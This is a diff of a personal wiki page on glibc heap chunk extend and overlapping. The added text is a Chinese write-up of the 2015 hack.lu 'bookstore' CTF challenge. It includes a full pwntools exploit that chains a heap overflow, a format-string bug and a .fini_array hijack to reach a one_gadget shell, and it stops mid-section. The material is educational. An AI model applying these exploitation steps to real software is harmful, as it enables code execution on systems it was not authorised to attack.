@@ -21,7 +21,7 @@
     
     
       
-        <title>堆拓展&溢出 - SkYe's Wiki</title>
+        <title>Chunk Extend and Overlapping - SkYe's Wiki</title>
       
     
     
@@ -98,7 +98,7 @@
           </span>
           <span class="md-header-nav__topic md-ellipsis">
             
-              堆拓展&溢出
+              Chunk Extend and Overlapping
             
           </span>
         </div>
@@ -160,7 +160,9 @@
         
           
 
-<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  
+
+<nav class="md-tabs md-tabs--active" aria-label="Tabs" data-md-component="tabs">
   <div class="md-tabs__inner md-grid">
     <ul class="md-tabs__list">
       
@@ -169,7 +171,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../../KnowExam/Know%26Exam/" class="md-tabs__link">
+        <a href="../../KnowExam/Know%26Exam/" class="md-tabs__link md-tabs__link--active">
           Pwn
         </a>
       
@@ -219,10 +221,12 @@
       
       
 
+  
 
-  <li class="md-nav__item md-nav__item--nested">
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
     
-      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" checked>
     
     <label class="md-nav__link" for="nav-1">
       Pwn
@@ -364,10 +368,12 @@
           
           
 
+  
 
-  <li class="md-nav__item md-nav__item--nested">
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
     
-      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-4" type="checkbox" id="nav-1-4">
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-4" type="checkbox" id="nav-1-4" checked>
     
     <label class="md-nav__link" for="nav-1-4">
       Glibc堆相关
@@ -484,6 +490,360 @@
     <a href="../off_by_one/" title="堆基础Off-By-One" class="md-nav__link">
       堆基础Off-By-One
     </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Chunk Extend and Overlapping
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 9h14V7H3v2m0 4h14v-2H3v2m0 4h14v-2H3v2m16 0h2v-2h-2v2m0-10v2h2V7h-2m0 6h2v-2h-2v2z"/></svg>
+        </span>
+      </label>
+    
+    <a href="./" title="Chunk Extend and Overlapping" class="md-nav__link md-nav__link--active">
+      Chunk Extend and Overlapping
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    介绍
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-inuse-fastbin-extend" class="md-nav__link">
+    基本示例 1：对 inuse 的 fastbin 进行 extend
+  </a>
+  
+    <nav class="md-nav" aria-label="基本示例 1：对 inuse 的 fastbin 进行 extend">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    注解
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-inuse-smallbin-extend" class="md-nav__link">
+    基本示例 2：对 inuse 的 smallbin 进行 extend
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-free-smallbin-extend" class="md-nav__link">
+    基本示例 3：对 free 的 smallbin 进行 extend
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chunk-extendshrink" class="md-nav__link">
+    Chunk Extend/Shrink 可以做什么
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-extend-overlapping" class="md-nav__link">
+    基本示例 4：通过 extend 后向 overlapping
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-extend-overlapping" class="md-nav__link">
+    基本示例 5：通过 extend 前向 overlapping
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hitcon-trainging-lab13" class="md-nav__link">
+    HITCON Trainging lab13
+  </a>
+  
+    <nav class="md-nav" aria-label="HITCON Trainging lab13">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    基本信息
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    基本功能
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    漏洞函数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    EXP
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    小结
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2015-hacklu-bookstore" class="md-nav__link">
+    2015 hacklu bookstore
+  </a>
+  
+    <nav class="md-nav" aria-label="2015 hacklu bookstore">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    基本信息
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    基本功能
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    漏洞函数
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞函数">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    堆溢出
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uaf" class="md-nav__link">
+    UAF
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    格式化字符串
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    奇怪的输入长度
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    思路
+  </a>
+  
+    <nav class="md-nav" aria-label="思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    控制格式化字符串内容
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fini_array" class="md-nav__link">
+    劫持 fini_array
+  </a>
+  
+    <nav class="md-nav" aria-label="劫持 fini_array">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#way-1" class="md-nav__link">
+    Way 1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#way-2" class="md-nav__link">
+    Way 2
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#main" class="md-nav__link">
+    修改 main 函数返回地址
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_1" class="md-nav__link">
+    exp
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    补充总结
+  </a>
+  
+    <nav class="md-nav" aria-label="补充总结">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fini_array_1" class="md-nav__link">
+    怎么找 fini_array ？
+  </a>
+  
+    <nav class="md-nav" aria-label="怎么找 fini_array ？">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#64" class="md-nav__link">
+    64 位静态链接程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#64_1" class="md-nav__link">
+    64 位动态链接程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    静态动态利用方式小结
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
   </li>
 
         
@@ -700,6 +1060,189 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#2015-hacklu-bookstore" class="md-nav__link">
+    2015 hacklu bookstore
+  </a>
+  
+    <nav class="md-nav" aria-label="2015 hacklu bookstore">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    基本信息
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    基本功能
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    漏洞函数
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞函数">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    堆溢出
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#uaf" class="md-nav__link">
+    UAF
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    格式化字符串
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    奇怪的输入长度
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    思路
+  </a>
+  
+    <nav class="md-nav" aria-label="思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    控制格式化字符串内容
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fini_array" class="md-nav__link">
+    劫持 fini_array
+  </a>
+  
+    <nav class="md-nav" aria-label="劫持 fini_array">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#way-1" class="md-nav__link">
+    Way 1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#way-2" class="md-nav__link">
+    Way 2
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#main" class="md-nav__link">
+    修改 main 函数返回地址
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_1" class="md-nav__link">
+    exp
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    补充总结
+  </a>
+  
+    <nav class="md-nav" aria-label="补充总结">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fini_array_1" class="md-nav__link">
+    怎么找 fini_array ？
+  </a>
+  
+    <nav class="md-nav" aria-label="怎么找 fini_array ？">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#64" class="md-nav__link">
+    64 位静态链接程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#64_1" class="md-nav__link">
+    64 位动态链接程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    静态动态利用方式小结
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -721,6 +1264,9 @@
                 
                 
                 <h1 id="_1">堆拓展&amp;溢出</h1>
+<blockquote>
+<p>绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录</p>
+</blockquote>
 <h2 id="_2">介绍</h2>
 <p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：</p>
 <ul>
@@ -763,7 +1309,7 @@
 <p>通过上面几个宏可以看出，<em>ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位</em>。简而言之，<strong>chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的</strong>。</p>
 <p>与 chunk extend 类似的还有一种称为 chunk shrink 的操作。这里只介绍 chunk extend 的利用。</p>
 <blockquote>
-<p><strong>以下示例代码，请勿加入 printf 等函数，因为程序没有初始化缓冲区，如果引入这些函数的话，程序会创建一个堆用作缓存</strong></p>
+<p><strong>以下示例代码，谨慎加入 printf 等函数，因为程序没有初始化缓冲区，如果引入这些函数的话，程序会创建一个堆用作缓存</strong></p>
 </blockquote>
 <h2 id="1-inuse-fastbin-extend">基本示例 1：对 inuse 的 fastbin 进行 extend</h2>
 <p>简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。 <strong>注意，我们的示例都是在 64 位的程序。如果想在 32 位下进行测试，可以把 8 字节偏移改为 4 字节</strong>。</p>
@@ -1170,6 +1716,297 @@ p.interactive()
 <ul>
 <li>分配大小在 fastbin 范围内的新堆块，需要大小匹配用 fastbin 的空闲堆块。举个例子：fastbin 中有一个 0x20 的空闲堆块，需要分配一个 0x40 堆块，会从 topchunk 中分割 0x40 出来（如果可以）。</li>
 </ul>
+<h2 id="2015-hacklu-bookstore">2015 hacklu bookstore</h2>
+<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore">题目链接</a></p>
+<h3 id="_10">基本信息</h3>
+<p>64 位动态链接的程序。</p>
+<pre><code>books: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3a15f5a8e83e55c535d220473fa76c314d26b124, stripped
+
+Arch:     amd64-64-little
+RELRO:    No RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+</code></pre>
+
+<h3 id="_11">基本功能</h3>
+<p>程序是一个买书的系统，最多只能购买两本书。每一本书都用一个独立的堆去维护，这个堆是程序自行申请的，不能人工干预的，固定大小为 0x80 。</p>
+<p>可以新增、删除书籍，最后提交是会将两本书（两个堆）信息合并到一个新的堆中，然后进行输出。</p>
+<h3 id="_12">漏洞函数</h3>
+<h4 id="_13">堆溢出</h4>
+<p>录入书籍信息用一个自定义输入函数，这个函数存在一个堆溢出的问题。结束输入的判断标准是遇到 \n ，需要注意的是自定义输入函数会在输入字符串最后加上一个 \x00 ：</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-03-UeGvjNWMx6CKidQp.png" /></p>
+<h4 id="uaf">UAF</h4>
+<p>程序的删除函数只是将堆释放，并没有将指针置零：</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-03-hPFo7mUDVdOY9rRM.png" /></p>
+<h4 id="_14">格式化字符串</h4>
+<p>程序退出打印信息时，会出现一个格式化字符串漏洞：</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-03-3RqbLskHDRReG7NX.png" /></p>
+<h4 id="_15">奇怪的输入长度</h4>
+<p>菜单选择输入长度上限为 0x80 ，这里不算是一个漏洞，但是会在后面利用当中运用到。</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-S4UbIBlARivRMmeo.png" /></p>
+<h3 id="_16">思路</h3>
+<blockquote>
+<p>这条题目利用起来比较复杂，涉及到堆溢出、堆重叠、格式化字符串、劫持 fini_array 。下面先写出大致步骤</p>
+</blockquote>
+<ol>
+<li>free book2</li>
+<li>利用堆溢出修改在 bin 中的 book2 size 为 0x151 ，让 summit 申请的 chunk 放在这里；写入精心布置的格式化字符串和 padding ，劫持 fini_array 、泄露地址</li>
+<li>第二轮运行程序： free book2</li>
+<li>利用堆溢出修改在 bin 中的 book2 size 为 0x151 ，让 summit 申请的 chunk 放在这里；写入精心布置的格式化字符串和 padding ，修改返回地址为 one_gadget</li>
+</ol>
+<p>产生这种解题思路思考方向：先着眼简单、已经学过熟悉的漏洞，也就是格式化字符串这个漏洞。利用格式化字符串的话，就是修改 got 表或者返回地址等控制程序流程 getshell 。</p>
+<ol>
+<li>这里 格式化字符串 出现在最后一个 printf ，也就是输出完成之后程序就会退出。</li>
+<li>格式化字符串的内容是从 submit  申请的 dest 中读取的。</li>
+<li>用户无法自行分配堆，只能从程序本身申请的 3 块堆和 submit 功能设法利用。</li>
+</ol>
+<h4 id="_17">控制格式化字符串内容</h4>
+<p>先来解决格式化字符串内容的问题。内容是从 dest 中读取的，就要设法控制 dest  内容。这里利用的是 overlapping 堆重叠，将 chunk2 和 chunk3 重叠起来，利用 submit 复制功能溢出控制 dest 中的内容。</p>
+<p>造成 overlapping 先 free chunk2 ，再通过写入 book1 功能溢出修改 chunk2 的 size 字段为 0x151 。这样当 submit 功能申请 0x140 堆块（不含chunk header）的时候就会去到 unsortedbin 中找到被我们修改大小为 0x151 的 chunk2 。</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-1f1IV0WHxcpMxOvo.png" /></p>
+<p>submit 功能正常情况下复制的内容是这样的：</p>
+<pre><code>&quot;Order 1: &quot; + book1 + &quot;\nOrder 2: &quot; + book2 + '\n'
+</code></pre>
+
+<p>但是我们将 chunk2 chunk3 重叠在一起，且 chunk header 是同一地址。简单点就是两个堆开始地址相同，结束地址不同。</p>
+<p>chunk1 chunk2 地址指针运行过程中没有被二次赋值，一直保存着申请堆时的地址。（free chunk2 时因为有 UAF 漏洞，所以没被重置。）造成的影响就是 chunk2 的内容 submit 的时候被写为 <code>"Order 1: " + book1</code>，详细过程如下：</p>
+<ol>
+<li>submit 处理 chunk1 信息，向 chunk3（即chunk2）写入：</li>
+</ol>
+<p><code>"Order 1: " + book1</code></p>
+<ol>
+<li>submit 处理 chunk2 信息，向 chunk3（即chunk2）写入：</li>
+</ol>
+<p><code>"\nOrder 2: " + "Order 1: " + book1 + '\n'</code></p>
+<p>先看看 chunk1、chunk2（chunk3）、dest 三个堆的分布情况：</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-waueydoBLLdD7QWO.png" /></p>
+<p>我们控制 chunk1 内容，写入有效 payload 和 padding ，将有效 payload 溢出写入到 dest （fd 指针处开始）。换句话就是我们希望图上 0xef3010 开始写入的内容，复制到 0xef3130 。可以得出计算公式：（"" 不算个数）</p>
+<pre><code># 需要在复制第二个chunk1前，填充好0x90字节，也就是chunk2(3) fd开始到dest fd开始的距离，这样chunk1就会被复制到dest fd开始
+&quot;Order 1:&quot; + chunk1 + &quot;\n&quot; + &quot;Order 2:&quot; + &quot;Order 1:&quot; == 0x90
+# 化简为
+chunk1 == 0x90 - 28 == 0x74
+</code></pre>
+
+<p>得出结论：将有效 payload 写在 chunk1 开头，然后将 chunk1 用非 \x00 填充长度为 0x74 ，当submit 的时候，有效 payload 就会放在 dest 的 fd 。这样就获得一个任意读写的格式化字符串，需要利用格式化字符串泄露、修改提前在修改 chunk1 时写入即可。</p>
+<p>目前得出 payload ：</p>
+<pre><code class="python">payload1 = 'b'*8    #格式化字符串
+payload1 = payload1.ljust(0x74,'a').ljust(0x88,'\x00')
+payload1 += p64(0x151)  
+edit(1,payload1)
+</code></pre>
+
+<h4 id="fini_array">劫持 fini_array</h4>
+<p>格式化字符串内容已经设法控制了，但是 getshell 需要两次使用这个漏洞，一次泄露地址，一次修改地址。</p>
+<p>这里就需要用到一个知识，main 函数是二弟，他有大哥，有三弟。程序开始先运行一次大哥，在运行 main ，最后运行三弟。三弟当做有个数组：<code>.fini_array</code> 。程序退出后会执行 <code>.fini_array</code> 地址出的函数，不过只能利用一次（动态链接程序）。</p>
+<p>所以我们可以在格式化字符串的第一轮泄露地址的同时，修改 .fini_array 的地址为 main 函数地址，让程序重新运行一次。main 函数地址易知，关键是 .fini_array 地址怎么找。</p>
+<blockquote>
+<p>动态链接与静态链接查找和利用有差别，为了篇幅将两者区别放在最后。对 64 位静态程序劫持 fini_array 有兴趣可以看看：<a href="https://www.mrskye.cn/archives/173/">劫持 64 位 fini_array 进行 ROP 攻击</a></p>
+</blockquote>
+<h5 id="way-1">Way 1</h5>
+<p>IDA 中 <code>Ctrl+S</code> 查找 .fini_array 地址，可以看到这个数组空间大小为 8 字节，只能放一个地址，这是与静态程序的一个区别（静态有两个地址）。</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-ztIjbG96doGOhSfu.png" /></p>
+<h5 id="way-2">Way 2</h5>
+<p>用 gdb 调试程序，输入 <code>elf</code> 查找 .fini_array </p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-qQxmRkH3KtjuybNr.png" /></p>
+<p>要素具备但是遇到一个问题，格式化字符串的内容是存放在堆上，栈上面只有该堆的指针而已。类似题目：ctf-wiki 的<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_example-zh/#_22">堆上的格式化字符串漏洞</a> 。</p>
+<p>这道题目我们不搞栈迁移到堆上面，而是利用菜单的奇怪输入长度，将地址写入到栈上。</p>
+<pre><code class="python"># 为了对齐前面填充8字节用来放菜单选项，fini_array偏移为13
+# 泄露libc可以用__libc_start_main也可以和我一样自己往栈上写一个
+payload2 = '5'*8 + p64(fini_array) + p64(free_got)
+p.recvuntil(&quot;5: Submit\n&quot;)
+p.sendline(payload2)
+</code></pre>
+
+<p>泄露 libc 地址和劫持 fini_array payload 目前构造：</p>
+<pre><code class="python">payload1 = &quot;%2617c%13$hn&quot; + '|' + &quot;%14$s&quot;
+payload1 = payload1.ljust(0x74,'a').ljust(0x88,'\x00')
+payload1 += p64(0x151)      
+edit(1,payload1)
+</code></pre>
+
+<h4 id="main">修改 main 函数返回地址</h4>
+<p>到这里我们就获取了 libc_base 地址并且进入了第二次的 main 函数。下一步就是如何利用了。</p>
+<p>就 free got 表改为 onegadget ？在这里不行，因为修改玩之后需要触发，也就是再一次进入 main 函数触发 free 函数。第二次进入 main 函数实际上是在 __libc_csu_fini 这个退出函数中调用 fini_array 数组中存储的函数（main），当执行完 main ，就会继续完成退出函数，然后正常退出程序。</p>
+<p>这里有两个思路：</p>
+<ol>
+<li>同第一次 mian 中，泄露出栈地址，通过调试获取到第二次 main 的返回地址与泄露栈地址的偏移，就可以获取到 main rip 的栈地址，我们对此进行修改。</li>
+<li>修改退出函数当中某个函数的 got 表，当完成退出函数调用这个函数就会 getshell。</li>
+</ol>
+<p>第二种思路是有几次比赛出现过这种利用方法，但没有在这道题目上尝试，主要是太费劲了。这道题就用第一种方法，就是需要我们泄露出 栈地址 ，然后因为栈结构固定，所以通过偏移算出第二 main 函数的返回地址。</p>
+<p>通过调试查看第一个 main 函数的栈空间结构体：</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-7YehpeGp46LWyAuO.png" /></p>
+<p>在格式化字符串的时候把这个地址也泄露出来：</p>
+<pre><code class="python">payload1 = &quot;%2617c%13$hn&quot; + '|' + &quot;%14$s&quot; + '-' + &quot;%24$p&quot;
+payload1 = payload1.ljust(0x74,'a').ljust(0x88,'\x00')
+payload1 += p64(0x151)      
+edit(1,payload1)
+</code></pre>
+
+<p>再次通过调试找到第二次 main 函数返回地址，然后计算固定偏移：</p>
+<pre><code class="python">0x7ffea45d8980-0x7ffea45d887a=0x106
+</code></pre>
+
+<p>所以得出计算公式：</p>
+<pre><code class="python"># ret_addr 为泄露地址
+attack_addr = ret_addr - 0x106
+</code></pre>
+
+<p>第二次进入 main 函数的利用思路就出来了，和第一次进入一样，先释放 chunk2 造成 overlapping 堆重叠，控制 dest 内容从而控制格式化字符串内容。利用格式化字符串修改第二次 main 函数的返回地址为 onegadget 。</p>
+<h3 id="exp_1">exp</h3>
+<pre><code class="python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Author  : MrSkYe
+# @Email   : skye231@foxmail.com
+# @File    : books.py
+from pwn import *
+context.log_level = 'debug'
+p = process(&quot;./books&quot;)
+elf = ELF(&quot;./books&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+def command(cmd):
+    p.recvuntil(&quot;5: Submit\n&quot;)
+    p.sendline(str(cmd))
+def edit(cmd,content):
+    command(cmd)
+    p.recvuntil(&quot;order:\n&quot;)
+    p.sendline(content)
+def free(cmd):
+    command(cmd+2)
+
+free_got = elf.got['free']
+fini_array = 0x6011B8
+main_addr = 0x400A39
+
+# ====round1====
+# free book2 放入 unsortedbin 
+free(2)
+# 修改 fini_array 为 main
+# 泄露 libc_base
+# 泄露 stack 地址
+payload1 = &quot;%2617c%13$hn&quot; + '|' + &quot;%14$s&quot; + '-' + &quot;%24$p&quot;
+payload1 = payload1.ljust(0x74,'a').ljust(0x88,'\x00')
+payload1 += p64(0x151)      
+edit(1,payload1)            
+
+# 从菜单选项将fini_array和free_got写入到栈上
+payload2 = '5'*8 + p64(fini_array) + p64(free_got)
+p.recvuntil(&quot;5: Submit\n&quot;)
+p.sendline(payload2)
+p.recvuntil(&quot;|&quot;)
+p.recvuntil(&quot;|&quot;)
+p.recvuntil(&quot;|&quot;)
+
+# 处理libc地址
+free_addr = u64(p.recv(6).ljust(8,'\x00'))
+log.info(&quot;free_addr:&quot;+hex(free_addr))
+libc_base = free_addr - libc.symbols['free']
+log.info(&quot;libc_base:&quot;+hex(libc_base))
+onegadget = libc_base + 0x45226 
+log.info(&quot;onegadget:&quot;+hex(onegadget))
+
+# 处理栈地址
+p.recvuntil(&quot;-&quot;)
+ret_addr = int(p.recv(14),16)
+log.info(&quot;ret_addr:&quot;+hex(ret_addr))
+attack_addr = ret_addr - 0x106
+log.info(&quot;attack_addr:&quot;+hex(attack_addr))
+
+# ====round2====
+
+# 同 round1
+free(2)
+
+# 处理格式化字符串填充字节数，处理高地址值小于低地址情况
+one_1 = onegadget &amp; 0xffff
+log.info(&quot;one_1:&quot;+hex(one_1))
+one_2 = onegadget&gt;&gt;16 &amp; 0xffff
+log.info(&quot;one_2:&quot;+hex(one_2))
+if one_1 &gt; one_2:
+    one_2 = one_2 + 0x10000 - one_1
+else:
+    one_2 -= one_1
+
+# 修改第二次main返回地址
+payload4 = &quot;%{}c%13$hn&quot;.format(one_1) + &quot;%{}c%14$hn&quot;.format(one_2)
+payload4 = payload4.ljust(0x74,'c').ljust(0x88,'\x00')
+payload4 += p64(0x151)
+edit(1,payload4)
+#gdb.attach(p)
+payload3 = '5'*8 + p64(attack_addr) + p64(attack_addr+2)
+p.recvuntil(&quot;5: Submit\n&quot;)
+
+p.sendline(payload3)
+
+p.interactive()
+</code></pre>
+
+<h3 id="_18">参考文章</h3>
+<ul>
+<li><a href="https://bbs.pediy.com/thread-246783.htm">hack.lu 2015 bookstore writeup</a></li>
+<li><a href="https://blog.csdn.net/qq_43449190/article/details/89077783">2015-hacklu-bookstore</a></li>
+</ul>
+<h3 id="_19">补充总结</h3>
+<h5 id="fini_array_1">怎么找 fini_array ？</h5>
+<p>首先 fini_array 是 __libc_csu_fini 函数里面会用的一个列表，当程序退出时会调用这个数组存放的一个或两个函数，调用完成后才继续完成退出函数，这时才是真正退出程序。</p>
+<h6 id="64">64 位静态链接程序</h6>
+<p>fini_array 数组长度为 0x10 字节，里面放了两个函数地址，退出 main 函数会先执行 fini_array[1] ，然后执行 fini_array[0] 。</p>
+<p>在<a href="https://www.mrskye.cn/archives/173">劫持 64 位静态程序 fini_array 进行 ROP 攻击</a>里面接触的是 64 位静态编译的程序，程序是没有符号表的，寻找 fini_array 方法是：</p>
+<p>首先 <code>readelf -h 程序名</code> 查看程序加载入口地址。</p>
+<p>gdb 调试将断点打在入口地址 ，然后找到有三个传参的 mov 指令，mov r8 就是 __libc_csu_fini 的地址：</p>
+<pre><code class="shell">.text:0000000000401A60                 public start
+.text:0000000000401A60 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
+.text:0000000000401A60 ; __unwind {
+.text:0000000000401A60                 xor     ebp, ebp
+.text:0000000000401A62                 mov     r9, rdx
+.text:0000000000401A65                 pop     rsi
+.text:0000000000401A66                 mov     rdx, rsp
+.text:0000000000401A69                 and     rsp, 0FFFFFFFFFFFFFFF0h
+.text:0000000000401A6D                 push    rax
+.text:0000000000401A6E                 push    rsp
+.text:0000000000401A6F                 mov     r8, offset sub_402BD0 ; fini
+.text:0000000000401A76                 mov     rcx, offset loc_402B40 ; init
+.text:0000000000401A7D                 mov     rdi, offset main
+.text:0000000000401A84                 db      67h
+.text:0000000000401A84                 call    __libc_start_main
+.text:0000000000401A8A                 hlt
+.text:0000000000401A8A ; } // starts at 401A60
+.text:0000000000401A8A start           endp
+</code></pre>
+
+<p>然后 <code>x /20i addr</code> 查看该地址开始的汇编，找到 <code>lea    rbp,[rip+0xb***1] # 0x4***f0</code> ，这个地址就是 fini_array[1] 的地址：</p>
+<pre><code class="shell">pwndbg&gt; x/20i 0x402bd0
